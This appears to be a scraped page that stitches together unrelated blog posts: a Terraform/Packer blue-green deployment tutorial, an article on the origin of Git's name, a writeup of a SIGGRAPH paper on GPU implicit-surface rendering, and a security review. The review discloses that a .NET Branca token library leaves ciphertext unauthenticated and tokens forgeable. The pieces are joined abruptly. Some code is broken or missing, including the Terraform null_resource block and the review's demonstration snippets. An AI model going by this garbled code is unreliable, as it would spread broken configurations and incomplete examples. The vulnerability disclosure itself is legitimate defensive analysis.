      <span>"image"</span><span>:</span> <span>"ubuntu-20-04-x64"</span><span>,</span>
      <span>"size"</span><span>:</span> <span>"s-1vcpu-1gb"</span><span>,</span>
      <span>"region"</span><span>:</span> <span>"nyc3"</span><span>,</span>
      <span>"ssh_username"</span><span>:</span> <span>"root"</span><span>,</span>
      <span>"snapshot_name"</span><span>:</span> <span>"{{user `color`}}-{{timestamp}}"</span>
    <span>}</span>
  <span>]</span>
<span>}</span>
</code></pre></div><p>The <code>provisioners</code> array should contain whatever provisioning code you need to create your application server. The important bits here are the <code>color</code> variable — the color that will be promoted, which we'll pass in from the command line — and the builder's <code>snapshot_name</code>, which is the name of the machine image Packer will create. This name is mostly arbitrary, but it does need to identify the color of the image. When we get to Terraform, we'll use a regular expression to retrieve the most recent image for which the name matches each color.</p>
<p>We can build&nbsp;now the image with this command:</p>
<div><pre><code data-lang="bash">packer build -var <span>color</span><span>=</span>blue server.json
</code></pre></div><p>To get started, run this once with <code>color=green</code> as well so you have one image for each color.</p>
<p>Now that we've created our images, we need to create the Terraform configuration. First, let's set up our DigitalOcean provider<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, which will let us create and modify resources on DigitalOcean:</p>
<div><pre><code data-lang="hcl"><span>provider</span> <span>"digitalocean"</span> {
<span>  token</span> <span>=</span> <span>"YOUR_API_TOKEN_GOES_HERE"</span>
}
</code></pre></div><p>Next, let's create the application server. Note that the second two blocks are the same as the first two, but with <code>green</code> instead of <code>blue</code>:</p>
<div><pre><code data-lang="hcl"><span>data</span> <span>"digitalocean_droplet_snapshot" "blue"</span> {
<span>  name_regex</span>  <span>=</span> <span>"^blue-"</span>
<span>  region</span>      <span>=</span> <span>"nyc3"</span>
<span>  most_recent</span> <span>=</span> <span>true</span>
}

<span>resource</span> <span>"digitalocean_droplet" "blue"</span> {
<span>  name</span>  <span>=</span> <span>"blue"</span>
<span>  image</span>      <span>=</span> <span>data</span><span>.</span><span>digitalocean_droplet_snapshot</span><span>.</span><span>blue</span><span>.</span><span>id</span>
<span>  region</span>     <span>=</span> <span>"nyc3"</span>
<span>  size</span>       <span>=</span> <span>"s-1vcpu-1gb"</span>
<span>  monitoring</span> <span>=</span> <span>true</span>
}

<span>data</span> <span>"digitalocean_droplet_snapshot" "green"</span> {
<span>  name_regex</span>  <span>=</span> <span>"^green-"</span>
<span>  region</span>      <span>=</span> <span>"nyc3"</span>
<span>  most_recent</span> <span>=</span> <span>true</span>
}

<span>resource</span> <span>"digitalocean_droplet" "green"</span> {
<span>  name</span>  <span>=</span> <span>"green"</span>
<span>  image</span>      <span>=</span> <span>data</span><span>.</span><span>digitalocean_droplet_snapshot</span><span>.</span><span>green</span><span>.</span><span>id</span>
<span>  region</span>     <span>=</span> <span>"nyc3"</span>
<span>  size</span>       <span>=</span> <span>"s-1vcpu-1gb"</span>
<span>  monitoring</span> <span>=</span> <span>true</span>
}
</code></pre></div><p>The <code>digitalocean_droplet_snapshot.blue</code> data block retrieves the most recent machine image (like the one we just created with Packer) whose name starts with <code>blue-</code>. Then, the <code>digitalocean_droplet.blue</code> resource creates a server using that image.</p>
<p>If we run Terraform, it should spin up two servers with the images Packer just created:</p>
<p>Now we should have two application servers online: one with the blue image and one with the green image. At this point, we’ve already accomplished our immutable infrastructure goal. Creating a new image for a color with Packer and then running Terraform will entirely replace the server of that color.</p>
<p>For the blue/green deployment, Terraform needs to know which color should be promoted. We can pass that in from the command line when we run Terraform:</p>
<div><pre><code data-lang="hcl"><span>variable</span> <span>"color"</span> {
<span>  type</span>        <span>=</span> <span>string</span>
<span>  description</span> <span>=</span> <span>"Which set of servers should be promoted."</span>
  <span>validation</span> {
<span>    condition</span>     <span>=</span><span> var.color</span> <span>=</span><span></span><span>=</span><span> "blue" || var.color</span> <span>=</span><span></span><span>=</span> <span>"green"</span>
<span>    error_message</span> <span>=</span> <span>"The color must be blue or green."</span>
  }
}

<span>locals</span> {
<span>  promoted_servers</span> <span>=</span><span> var.color</span> <span>=</span><span></span><span>=</span> <span>"blue"</span> <span>?</span> <span>digitalocean_droplet</span><span>.</span><span>blue</span> <span>:</span> <span>digitalocean_droplet</span><span>.</span><span>green</span>
<span>  demoted_servers</span>  <span>=</span><span> var.color</span> <span>=</span><span></span><span>=</span> <span>"blue"</span> <span>?</span> <span>digitalocean_droplet</span><span>.</span><span>green</span> <span>:</span> <span>digitalocean_droplet</span><span>.</span><span>blue</span>
}
</code></pre></div><p>The <code>variable.color</code> block takes either <code>blue</code> or <code>green</code> as input. Terraform configuration is declarative, so the color we pass determines which set will be promoted.</p>
<p>The <code>locals</code> block below it creates two groups: one for the promoted servers, and one for the demoted servers. The color that makes up the <code>promoted_servers</code> group is the same one we passed in as <code>variable.color</code>; it contains the servers that will be promoted. The <code>demoted_servers</code> group, then, contains the current set of live servers that will be demoted.</p>
<p>Now we need to point our nginx load balancer at the correct set of servers. But before we can do that, we need to create the load balancer in the first place:</p>
<div><pre><code data-lang="hcl"><span>data</span> <span>"digitalocean_droplet_snapshot" "balancer"</span> {
<span>  name_regex</span>  <span>=</span> <span>"^balancer-"</span>
<span>  region</span>      <span>=</span> <span>"nyc3"</span>
<span>  most_recent</span> <span>=</span> <span>true</span>
}

<span>resource</span> <span>"digitalocean_droplet" "balancer"</span> {
<span>  name</span>       <span>=</span> <span>"balancer"</span>
<span>  image</span>      <span>=</span> <span>data</span><span>.</span><span>digitalocean_droplet_snapshot</span><span>.</span><span>balancer</span><span>.</span><span>id</span>
<span>  region</span>     <span>=</span> <span>"nyc3"</span>
<span>  size</span>       <span>=</span> <span>"s-1vcpu-1gb"</span>
<span>  monitoring</span> <span>=</span> <span>true</span>
}
</code></pre></div><p>I use Packer to provision the load balancer as well (which is why it uses a <code>digitalocean_droplet_snapshot</code> as its image) but you can provision it however you’d like.</p>
<p>For the purposes of this tutorial, we'll assume your load balancer is running nginx. Here’s the configuration<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>:</p>
<div><pre><code data-lang="nginx"><span>upstream</span> <span>backend</span> <span>{</span>
  <span>%{</span> <span>for</span> <span>ip</span> <span>in</span> <span>promoted_servers</span> <span>~</span><span>}</span>
  <span>server</span> <span>${ip}</span><span>;</span>
  <span>%{</span> <span>endfor</span> <span>~</span><span>}</span>
  <span>%</span><span>{</span> <span>for</span> <span>ip</span> <span>in</span> <span>demoted_servers</span> <span>~</span><span>}</span>
  <span>server</span> <span>${ip}</span> <span>backup</span><span>;</span>
  <span>%{</span> <span>endfor</span> <span>~</span><span>}</span>
<span>}</span>

<span>server</span> <span>{</span>
  <span>listen</span> <span>80</span><span>;</span>

  <span>location</span> <span>/</span> <span>{</span>
    <span>proxy_pass</span> <span>http://backend</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div><p>The relevant portion is that <code>upstream.backend</code> block up top. We use <a href="https://www.terraform.io/docs/configuration/functions/templatefile.html">Terraform’s templating capabilities</a> to enumerate <strong>both</strong> sets of servers. The demoted set is marked with the <a href="https://nginx.org/en/docs/http/ngx_http_upstream_module.html#backup">backup directive</a>, which means it will be passed requests only when the promoted set is unavailable. Listing both sets of upstream servers this way prevents requests from being dropped in case the promoted set isn't immediately ready to begin serving requests.</p>
<p>Unfortunately, Terraform doesn't have any built-in mechanisms for keeping this file up–to–date. That brings us to the final piece of the puzzle: the <a href="https://registry.terraform.io/providers/hashicorp/null/latest/docs/resources/resource">null resource</a>.</p>
<p>A null resource is an escape hatch within Terraform — a way to execute arbitrary code. We'll use it to update our load balancer with an nginx configuration containing the correct server IP addresses on every deploy. Here's what it looks like:</p>
<div><pre><code data-lang="hcl"><span>resource</span> <span>"null_resource" "provision_balancer"</span> {
<span>  triggers</span> <span>=</span> {
<span>    balancer</span> <span>=</span> <span>digitalocean_droplet</span><span>.</span><span>balancer</span><span>.</span><span>id</span>
<span>    servers</span> <span>=</span> <span>"${join(",", concat(local.promoted_servers.*.id, local.demoted_servers.*.id))}"</span>
  }

  <span>connection</span> {
<span>    type</span> <span>=</span> <span>"ssh"</span>
<span>    host</span> <span>=</span> <span>digitalocean_droplet</span><span>.</span><span>balancer</span><span>.</span><span>ipv4_address</span>

<span>      demoted_servers</span> <span>=</span> <span>local</span><span>.</span><span>demoted_servers</span><span>.</span><span>*</span><span>.</span><span>ipv4_address</span>
    }<span>)</span>
<span>    destination</span> <span>=</span> <span>"/tmp/songrender.com"</span>

      <span>"sudo systemctl reload nginx"</span>
    <span>]</span>
  }
}

			                    <h2>Introduction</h2>
<p>In this article, we will discuss why Linus Torvalds, the creator of Git, chose this name for his Version Control System (VCS).</p>
<h2>What is the meaning of Git?</h2>
<p>When Linus Torvalds made his initial commit of Git's code on April 7th 2005, he added a file called <code>README</code>. The first paragraph in this file reads:</p>
<pre><code>GIT - the stupid content tracker

"git" can mean anything, depending on your mood.

 - random three-letter combination that is pronounceable, and not 
   actually used by any common UNIX command.  The fact that it is a
   mispronunciation of "get" may or may not be relevant.
 - stupid. contemptible and despicable. simple. Take your pick from the 
   dictionary of slang.
 - "global information tracker": you're in a good mood, and it actually
   works for you. Angels sing, and a light suddenly fills the room. 
 - "goddamn idiotic truckload of sh*t": when it breaks

This is a stupid (but extremely fast) directory content manager.  It  
doesn't do a whole lot, but what it _does_ do is track directory
contents efficiently.
</code></pre>
<p>As we can see from the paragraph above, Linus kindly offers multiple explanations for Git's meaning:</p>
<ol>
<li>The first reason could be viewed as one of practicality. A three letter command is quick and easy to say and type.</li>
<li>The word "Git" is not used by any other existing Unix command.</li>
<li>The initial working version of Git's code was very simple, so much so that he finds it deserving of insult.</li>
<li>An acronym for <strong>Global Information Tracker</strong>, at least when it works properly.</li>
<li>An acronym for <strong>Goddamn Idiotic Truckload of sh*t</strong>, when it doesn't work properly.</li>
</ol>
<h2>Conclusion</h2>
<p>Using these five reasons for choosing the name "Git", we can try to answer the question "<em>What does Git stand for?</em>". It appears that Linus Torvalds wanted to make the point that a simple solution can solve a big and important problem. He also tried to acknowledge that there was much work to be done to build Git into a fully featured tool that could be truly useful for developers. After years of development, maybe the current version of Git isn't so stupid after all...</p>
<p>If you're interested in a great beginner book on using Git, I highly recommend <a href="https://www.amazon.com/gp/product/1449316387/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1449316387&amp;linkCode=as2&amp;tag=initialcommit-20&amp;linkId=57e3e853b8ac3dfca936419601b4dbf8" target="_blank">Version Control with Git, by O'Reilly Media</a>. I read this book a few years ago and it clarified a lot of Git concepts and commands that I now use almost every day!</p>

<h2>Or, "How I turned my side project into a paper at a top graphics conference"</h2>
<p>In my spare time between late 2019 and early 2020,
I wrote a <a href="https://www.mattkeeter.com/research/mpr">technical paper</a> which was accepted to
<a href="https://www.siggraph.org/">SIGGRAPH</a>.</p>
<p><a href="https://www.mattkeeter.com/research/mpr"><img src="https://www.mattkeeter.com/projects/siggraph/paper.png" alt="Paper"></a></p>
<p>SIGGRAPH is, by all accounts, the best research venue in computer graphics,
so I was aiming a bit high, but a man's gotta have hobbies.</p>
<p>This writeup is a behind-the-scenes look at the experience.
For example, you'll learn why 3/5 reviewers
recommended rejecting the paper,
and how I managed to change their minds in my rebuttal.</p>
<p>Hopefully, this will help folks considering a similar path;
this information is normally passed down through academic research groups,
so it's hard to know what to expect as an independent researcher.</p>
<h2>What's the paper about?</h2>
<p>(If you've read the paper, skip to the <a href="#timeline">timeline</a>)</p>
<p>You can <a href="https://www.mattkeeter.com/research/mpr/keeter_mpr20.pdf">read it</a> (PDF, 4.6 MB),
but I'll present a summary here.</p>
<p>The paper presents a new way to render closed-form <a href="https://en.wikipedia.org/wiki/Implicit_surface">implicit surfaces</a> on the GPU.</p>
<p>Our implicit surfaces are defined by a function \(f(x, y, z)\) which
can be evaluated at any point \((x, y, z)\) in space.
Where the function is <em>negative</em>, we're inside the shape;
where the function is <em>positive</em>, we're outside the shape.
The boundary of the shape is the <a href="https://en.wikipedia.org/wiki/Isosurface">isosurface</a>
\(f(x, y, z) = 0\).</p>
<p>"Closed-form" means the function is built from a bunch of math operations,
e.g.</p>
<p>$$\max\left(0.5 - \sqrt{x^2 + y^2}, \sqrt{x^2 + y^2} - 1\right) &lt; 0$$</p>
<p>(rather than a more powerful representation that supports looping or branching)</p>
<p>This is a simple and homogeneous representation, though it's very low-level.
Think of it as an assembly language for shapes:
painful to write manually,
but a reasonable target for higher-level tools.</p>
<p>We take this representation and convert it into a directed acyclic graph,
which deduplicates common subexpressions:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/annulus.png" alt="Annulus"></p>
<p>Then, we convert this graph to a <em>tape</em>,
which is straight-line code that's equivalent to the DAG.
In this step, we perform <a href="https://en.wikipedia.org/wiki/Register_allocation">register allocation</a>
when deciding where to store intermediate results.</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/tape.png" alt="Tape"></p>
<p>We upload the tape to the GPU,
where the interesting work happens!</p>
<p>We evaluate the tape using <a href="https://en.wikipedia.org/wiki/Interval_arithmetic">interval arithmetic</a>,
which lets us check whether a particular region is inside, outside,
or on the shape's boundary.
Since we're on the GPU, this evaluation is done for many regions in parallel.</p>
<p>For regions that are ambiguous,
we subdivide them and recurse.
While recursing,
we prune the tapes to only contain active clauses,
which lets us do much less work in evaluating.</p>
<p>This evaluation process subdivides down to individual pixels / voxels,
which are then evaluated directly.  In 3D, we also use
<a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation</a>
to estimate surface normals.</p>
<p>Here's what this looks like in 2D, rendering a quarter-circle:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/recursion.png" alt="Recursion"></p>
<p>At a high level, this is all very similar to
<a href="http://fab.cba.mit.edu/classes/S62.12/docs/Duff_interval_CSG.pdf">Interval Arithmetic and Recursive Subdivision for Implicit Functions and Constructive Solid Geometry (Duff '92)</a>.
The interesting part of my paper is in adapting this algorithm
(which is deeply recursive with heterogenous workflows in each branch)
to run well on GPUs,
plus a bunch of real-world implementation details and benchmarks.</p>
<p>The pipeline works in both 2D and 3D.  In 2D, it produces black-and-white images,
while in 3D, it produces heightmaps and normals:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/depth_norm.png" alt="Depth and normal images"></p>
<p>The paper concludes with benchmarking results and directions for future research.</p>

<h2>Timeline (2019-2020)</h2>
<p>Writing this paper filled about six months of my nights-and-weekends spare time,
with a mix of development, writing, editing, and waiting.</p>
<h3>May (2019) and earlier</h3>
<p>Back in grad school,
I worked on software for computer-aided design using
<a href="https://en.wikipedia.org/wiki/Function_representation">functional representations</a>
as the underlying model representation.</p>
<p>After graduation,
this work continued as a long-running side project,
with a <a href="https://www.mattkeeter.com/projects/kokopelli">few</a> <a href="https://www.mattkeeter.com/projects/antimony/">design</a> <a href="https://libfive.com/studio/">tools</a>
and an <a href="https://libfive.com/">open-source kernel</a>
that's used in both open-source and commercial CAD packages.
I'd made various <a href="https://github.com/libfive/libfive/commit/50ca3fd8ddd3db401ade3d1f2924e6adb27bd630">attempts</a>
over the years to put rendering on the GPU,
but without any success until now.</p>
<p>The most recent, successful work was inspired by
<a href="https://raphlinus.github.io/rust/graphics/gpu/2019/05/08/modern-2d.html">this blog post</a>
in May 2019.
I read through the blog post,
then skimmed the cited research papers
and reference implementation,
and started pondering whether a similar strategy
could work for functional representations.</p>
<h3>October-December (2019): Implementation</h3>
<p>The first tangible hints of this project are an October 11th entry in my engineering notebook,
boldly titled "GPU-Accelerated F-Rep Rendering" (click for full resolution).</p>
<p><a href="https://www.mattkeeter.com/projects/siggraph/notebook.jpg"><img src="https://www.mattkeeter.com/projects/siggraph/oct11.jpg" alt="Notebook"></a></p>
<p>The fascinating part, looking back, is how <em>close</em> this turned out to be –
it's not exactly what I ended up implementing and writing up,
but it's about 90% of the way there.</p>
<p>I started development on October 14th.
Out of the gate, I decided to use <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a> for GPU acceleration:
I've got an Macbook Pro from the NVIDIA days, so CUDA runs on it,
and I didn't want to make my life harder than necessary.
This would prove to be a good decision,
because I'd later use the same code to benchmark on
more powerful Linux workstations.</p>
<p>(As a side note, I have no idea what I'll do when this laptop dies –
I like Apple's hardware and software,
but also like being able to do cross-platform development)</p>
<p>The project started as a purely 2D renderer.
Like most GPU projects,
it had particularly aesthetic glitches:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/glitches.png" alt="glitches"><br>
(October 26-29)</p>
<p>By mid-November,
the core 2D algorithm was working,
and I began implementing a demo GUI.
This was motivated in part by an upcoming visit to
my <a href="http://cba.mit.edu/">old research group</a>:
I wanted to show them what I was working on and get their feedback.</p>
<p>By November 17th, the GUI looked like this:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/nov17.png" alt="2D GUI"></p>
<p>This reuses the <a href="http://libfive.com/studio/">Scheme bindings and standard library from <code>libfive</code></a>
which was a huge time saver.</p>
<p>The visit to CBA went well.
I had already convinced myself that I need 3D rendering
to make this a good paper, and they agreed.
Neil also suggested benchmarking against a brute-force renderer,
which led to Figure 5 in the final paper.</p>
<p>By November 27th, I had implemented 3D rendering:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/nov27.png" alt="3D GUI"></p>
<p>At this point, I switched gears and started working on the paper itself.</p>
<h3>December (2019) - January (2020): Writing the paper</h3>
<p>The first commit in the paper repository is dated to December 1st.</p>
<p>There's a fair amount of infrastructure involved in writing a technical paper.</p>
<ul>
<li>LaTeX (which I already knew)</li>
<li>The <code>acmart</code> document class</li>
<li>Using BibTex to track sources</li>
<li>Writing a <code>Makefile</code> to compile the paper</li>
</ul>
<p>None of this is <em>hard</em>,
but it's time-consuming to learn and set up.
<a href="https://cs.dartmouth.edu/%7Ewjarosz/writing.html">This page</a>
is a great (if somewhat overwhelming) list of things to keep in mind when
writing a technical paper.
<a href="https://www.siggraph.org/sites/default/files/kajiya.pdf">How to Get Your SIGGRAPH Paper Rejected</a>
is another good reference, as is
<a href="https://graphics.stanford.edu/%7Ekayvonf/notes/systemspaper/">What Makes a (Graphics) Systems Paper Beautiful</a>.</p>
<p>I also leaned heavily on reading past papers, not just for content,
but for form.  <a href="https://www.cs.toronto.edu/%7Ejacobson/">Alec Jacobson's research group</a>
has published consistently strong SIGGRAPH papers,
and I often referred to the
<a href="https://www.cs.toronto.edu/%7Ejacobson/images/tetrahedral-meshing-in-the-wild-siggraph-2018-hu-et-al.pdf">TetWild paper</a>
(PDF)
when I had questions of style.</p>
<p>I traditionally visit family over Thanksgiving,
then stay in Boston over Christmas break for some downtime.
This year, writing the paper was my major project.
It's hard to say exactly how much time went into the writing of the paper,
but I spent a hour or two each evening working on it.</p>
<h4>Citing previous work</h4>
<p>I was extremely nervous about this section of the <a href="https://s2020.siggraph.org/submissions/technical-papers-submissions/">Technical Papers guidelines</a>:</p>
<blockquote>
<p>...a paper may also be rejected [before review] if it solves a problem that is known to be already solved;
does not cite (and the authors seem unaware of) important prior work on
the same problem and doesn't address how it is different;...</p>
</blockquote>
<p>This nervousness led to me spending a lot of time reviewing previous papers,
then tracking down their sources,
and so on.
I didn't read every word of every cited paper,
but I certainly looked at a <em>lot</em> of prior research,
both for inspiration and to compare against in the "Prior Work" section of the paper.</p>
<p>(Even then,
I got called out by the primary reviewer for citing "obscure" references
instead of more standard ones)</p>
<h4>Finding interesting demo models</h4>
<p>In the mesh world, there's a
<a href="https://en.wikipedia.org/wiki/List_of_common_3D_test_models">long list of common models</a>.
Sadly, there's no equivalent for implicit surfaces,
and despite my enthusiasm for 3D graphics, I'm a terrible 3D artist.</p>
<p>I tackled this from several angles.
First, I made a relatively straight-forward copy of the
<a href="https://en.wikipedia.org/wiki/Bethesda_Terrace_and_Fountain">Bethesda Terrace and Fountain</a>:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/bridge.png" alt="Terrace bridge"></p>
<p>(based on a previous design by my wife)</p>
<p>Second, I reached out to <a href="http://raven.works/">Hazel</a>,
who has contributed to <a href="https://libfive.com/studio">Studio</a> in the past;
she graciously shared a bear head sculpture to use as an example in the paper:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/bear.png" alt="Bear"></p>
<p>This model is a <em>particularly challenging</em> benchmark for my algorithm,
because it's built of smooth operations which can't be culled,
unlike hard-surface CSG modeling.</p>
<p>Finally, I dug up an involute gear model that has followed me around
<a href="https://www.mattkeeter.com/projects/kokopelli/">since 2013</a>,
which is an interesting middle ground:
it's primarily CSG, but uses expensive trigonometric functions.</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/gears.png" alt="Gears"></p>
<p>Of course,
the pattern of the three gears is a tribute to the venerable
<a href="https://www.x.org/archive/X11R7.0/doc/html/glxgears.1.html"><code>glxgears</code></a>.</p>
<h4>Making pictures pretty</h4>
<p>In early December,
I made a second visit to CBA to show off 3D rendering.
The main advice from this visit was that I needed
snazzy demo pictures.
In light of this feedback,
I implemented two new features:</p>
<ul>
<li>Rendering with perspective</li>
<li>Screen-space ambient occlusion</li>
</ul>
<h4>Benchmarking</h4>
<p>Since this was a systems paper,
I wanted to present benchmarking results to examine performance and scaling.
More importantly, the whole point of this research is to render things <em>fast</em>,
and my 2013 Macbook wasn't powerful enough to
claim "interactive framerates" with a straight face.</p>
<p><a href="https://galese.net/">Martin Galese</a> – a long-time friend –
founded <a href="https://patentmark.ai/">Patentmark</a>,
a startup which uses machine learning to improve the patent review process.
As part of this work,
he's got a hefty VR/ML workstation in his basement
to train ML models.
He was kind enough to give me an account on the machine,
so I could SSH in and run benchmarks on a relatively recent GPU.</p>
<p>This machine has a flagship 2017 GPU
(<a href="https://www.nvidia.com/en-sg/geforce/products/10series/geforce-gtx-1080-ti/">NVIDIA GTX 1080 Ti</a>)
but I was left wondering whether I could get access to anything bigger.</p>
<p>As it turns out, AWS will give you a
<a href="https://www.nvidia.com/en-us/data-center/v100/">Tesla V100</a>
for a mere $3.06/hour.
This is a truly absurd GPU,
intended for …</p></div></div>

  <div itemprop="articleBody">
    <h3 id="introduction">Introduction</h3>

<p>Some time back, I was looking at token authentication formats to authenticate some API calls. I didn’t even attempt to look at JWT &amp; Co. for <a href="https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid">multiple reasons</a>. I landed between <a href="https://paseto.io/">PASETO</a> and <a href="https://branca.io/">Branca</a>.</p>

<p>I chose Branca for its simplicity. I needed authenticated API calls with a shared symmetric key. Both Branca and PASETO implemented this using XChaCha20-Poly1305, but PASETO also supports asymmetric authentication, which I didn’t need. I was quite pleased by looking at how straight-forward Branca <a href="https://github.com/tuupola/branca-spec#token-format">made it</a>:</p>
<div><div><pre><code>Version (1B) || Timestamp (4B) || Nonce (24B) || Ciphertext (*B) || Tag (16B)
</code></pre></div></div>

<p>Simply construct a header and encrypt and authenticate the payload using XChaCha20-Poly1305, with the header as the AAD.</p>

<p>Back then, there was only one <a href="https://github.com/thangchung/branca-dotnet">.NET implementation</a>, which targeted .NET Core whereas I needed .NET Framework. I took a quick look: there were no test vectors and used ChaCha20-Poly1305 instead of XChaCha20-Poly1305. It was only available GitHub, so I thought it may just be a toy project for fun. I dropped it and forgot about it.</p>

<p>Fast forward a couple of days ago, I returned to find <a href="https://github.com/scottbrady91/IdentityModel">a new</a> .NET Core implementation. It was also published as a NuGet, which got my hopes up - might be a polished implementation that I could get working on .NET Framework.</p>

<p><a href="https://www.nuget.org/packages/ScottBrady.IdentityModel/">ScottBrady.IdentityModel</a> is a relatively new NuGet, with three releases in total. Its first release was at the beginning of May this year and the latest was at the beginning of this August. It uses <a href="https://www.bouncycastle.org/csharp/index.html">BouncyCastle</a> for cryptographic implementations and offers both PASETO and Branca.</p>

<p>Note: All code discussed is based on the master branch at <a href="https://github.com/scottbrady91/IdentityModel/commit/4ff8a06719bd83a4129f45d2ce92f1891a51bd01">4ff8a06</a>. I’ll also be referring to this NuGet as just IdentityModel throughout the rest of this post.</p>

<h3 id="inspection">Inspection</h3>

<h4 id="tokenssecuritytokenexception-invalid-message-authentication-code">Tokens.SecurityTokenException: Invalid message authentication code</h4>

<p>I pulled down IdentityModel in a new project and took some <a href="https://github.com/tuupola/branca-js/blob/master/test.js">test vectors</a> from the JS reference implementation, which is linked in the specification for Branca.</p>

<p>I was already off to a good start.</p>

<h4 id="nonce-generation">Nonce generation</h4>
<p>Starting at the top of the file containing the Branca implementation, comes <code>CreateToken()</code>. The first thing is nonce generation:</p>
<div><div><pre><code><span>var</span> <span>nonce</span> <span>=</span> <span>new</span> <span>byte</span><span>[</span><span>24</span><span>];</span>
<span>RandomNumberGenerator</span><span>.</span><span>Create</span><span>().</span><span>GetBytes</span><span>(</span><span>nonce</span><span>);</span>
</code></pre></div></div>

<p>It uses the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator.getbytes?view=netcore-3.1">System.Security.Cryptography.RandomNumberGenerator.GetBytes</a> method, which is intended for cryptographic purposes, so that checks out.</p>

<h4 id="unauthenticated-ciphertext">Unauthenticated ciphertext</h4>

<p>After the nonce is generated, the header is created according to the specification. No problem there. Then comes the encryption:</p>

<div><div><pre><code><span>keyMaterial</span> <span>=</span> <span>new</span> <span>KeyParameter</span><span>(</span><span>key</span><span>);</span>
<span>var</span> <span>parameters</span> <span>=</span> <span>new</span> <span>ParametersWithIV</span><span>(</span><span>keyMaterial</span><span>,</span> <span>nonce</span><span>);</span>

<span>var</span> <span>engine</span> <span>=</span> <span>new</span> <span>XChaChaEngine</span><span>();</span>
<span>engine</span><span>.</span><span>Init</span><span>(</span><span>true</span><span>,</span> <span>parameters</span><span>);</span>
</code></pre></div></div>

<p>I’m not familiar with BouncyCastle, so I checked its source to see what <code>KeyParameter</code> and <code>ParametersWithIV</code> were doing. They were simply wrappers for the parameters.</p>

<p><code>XChaChaEngine()</code> was not from BouncyCastle however, but implemented in IdentityModel:</p>

<div><div><pre><code><span>using</span> <span>Org.BouncyCastle.Crypto.Engines</span><span>;</span>

<span>namespace</span> <span>ScottBrady.IdentityModel.Crypto</span>
<span>{</span>
    <span>public</span> <span>class</span> <span>XChaChaEngine</span> <span>:</span> <span>ChaChaEngine</span>
    <span>{</span>
        <span>public</span> <span>XChaChaEngine</span><span>()</span> <span>:</span> <span>base</span><span>(</span><span>20</span><span>)</span> <span>{</span> <span>}</span>

        <span>public</span> <span>override</span> <span>string</span> <span>AlgorithmName</span> <span>=&gt;</span> <span>"XChaCha20"</span><span>;</span>

    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>After initializing the <code>XChaChaEngine</code>, the payload is “encrypted and authenticated”:</p>

<div><div><pre><code><span>var</span> <span>plaintextBytes</span> <span>=</span> <span>Encoding</span><span>.</span><span>UTF8</span><span>.</span><span>GetBytes</span><span>(</span><span>payload</span><span>);</span>

<span>var</span> <span>poly</span> <span>=</span> <span>new</span> <span>Poly1305</span><span>();</span>
<span>poly</span><span>.</span><span>Init</span><span>(</span><span>keyMaterial</span><span>);</span>

</code></pre></div></div>

<p>This is <strong>not a XChaCha20-Poly1305 construction</strong>. There is no padding of the AAD nor the ciphertext during authentication. Neither is there any authentication of their length. All this is specified in the <a href="https://github.com/bikeshedders/xchacha-rfc">draft RFC</a> and the <a href="https://tools.ietf.org/html/rfc8439">RFC for ChaCha20-Poly1305</a>. Actually, this does not even authenticate the ciphertext since <code>DoFinal()</code> writes the current tag into <code>ciphertext</code>. The <strong>ciphertext can be modified without invalidating the token</strong>.</p>

<div><div><pre><code><span>var</span> <span>handler</span> <span>=</span> <span>new</span> <span>BrancaTokenHandler</span><span>();</span>

</code></pre></div></div>

<p>Running this will return <code>Tesu</code> instead of <code>Test</code>. Thereby, <strong>IdentityModel allows attackers to arbitrarily modify the payload of a Branca token</strong>.</p>

<p>After searching BouncyCastle, I found no XChaCha20 implementation but a ChaCha20-Poly1305, which had the following fields:</p>

<div><div><pre><code><span>private</span> <span>readonly</span> <span>ChaCha7539Engine</span> <span>mChacha20</span><span>;</span>
<span>private</span> <span>readonly</span> <span>IMac</span> <span>mPoly1305</span><span>;</span>
</code></pre></div></div>

<p>As you might have noticed, <code>ChaCha7539Engine</code> is not the same engine that is implemented by <code>XChaChaEngine</code> in IdentityModel. Turns out, IdentityModel uses the ChaCha20 variant with a 64-bit nonce, instead of the 96-bit nonce required by the IETF version of ChaCha20. Both ChaCha20-Poly1305 and XChaCha20-Poly1305 require the IETF variant of ChaCha20. Taking a look at <code>ChaChaEngine</code> from BouncyCastle, there is no HChaCha20 being used to calculate a subkey, if the nonce length is set to 24 as in <code>XChaChaEngine</code>. Therefore, all we’re left with is the original ChaCha20 from DJB, using an 8-byte nonce, meaning <code>engine.Init(true, parameters)</code> only loads 8 bytes of the 24-byte nonce that has been generated.</p>

<p>The Branca specification makes it <a href="https://github.com/tuupola/branca-spec">pretty clear</a> how to encrypt the payload:</p>
<blockquote>
  <ol>
    <li>Encrypt the user given payload with IETF XChaCha20-Poly1305 AEAD with user-provided secret key. Use the header as the additional data for AEAD.</li>
  </ol>
</blockquote>

<p>It doesn’t have to be made as complicated as the above code from IdentityModel. If one reads the draft RFC, or looks at another implementation, it eventually becomes clear that XChaCha20-Poly1305 is “just” a combination of HChaCha20 and ChaCha20-Poly1305.</p>

<h4 id="forgeable-tokens">Forgeable tokens</h4>
<p>Let’s return to the attempt of authenticating the header and ciphertext. Specifically, this line:</p>


<p><code>keyMaterial</code> is <strong>the same key</strong> that was used to initialize the <code>XChaChaEngine</code>.</p>

<blockquote>
  <p>The sender must not use crypto_onetimeauth to authenticate more than one message under the same key. Authenticators for two messages under the same key should be expected to reveal enough information to allow forgeries of authenticators on other messages.</p>
</blockquote>

<p>(From <a href="https://nacl.cr.yp.to/onetimeauth.html">NaCl</a>)</p>

